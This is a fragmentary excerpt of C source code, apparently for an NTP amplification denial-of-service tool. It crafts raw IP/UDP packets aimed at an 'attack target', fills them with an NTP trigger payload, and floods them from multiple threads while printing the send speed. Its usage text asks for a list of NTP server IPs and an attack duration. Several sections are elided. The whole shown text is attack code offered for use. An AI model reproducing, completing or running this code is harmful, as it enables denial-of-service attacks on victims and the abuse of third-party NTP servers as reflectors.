...
double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 8 *
sizeof(UCHAR);
char buffer[500];
struct ip *ipp;
struct udphdr *udp;
...
ipp->ip_dst=servaddr.sin_addr; /*The destination address, that is, the
attack target*/
ipp->ip_sum=0;
//Fill UDP header
...
//Fill the NTP header
memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , ntp_magic , 8 *
sizeof(UCHAR));
ALIVE_THREADS++;
...
sendto(sockfd,buffer,pack_len,0,(struct sockaddr
...
double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 8 *
sizeof(UCHAR);
ALIVE_THREADS++;
while(true)
{
...
attack_time = difftimeval(&end, &ATTACK_START_TIME); //Calculate attack
time
...
send_package = SEND_PACKAGE; //Take the total number of packages sent in
the current time period
time_range = difftimeval(&end, &start); //Calculate running time in
microsecond level
per_second = ( ntp_buffer_size / 1000000 * send_package ) / (time_range /
1000000 );
printf(" [>] Speed %f M/S ,Send %d Pack , Current Server =>
...
printf("[time]: The duration of the attack (default 30
seconds).\n\n");
printf("Important: This Program needs file \"ntp.list\" in current
folder, which has some ntp server ip.\n");
return 0;
}
if(argc >= 4)
{
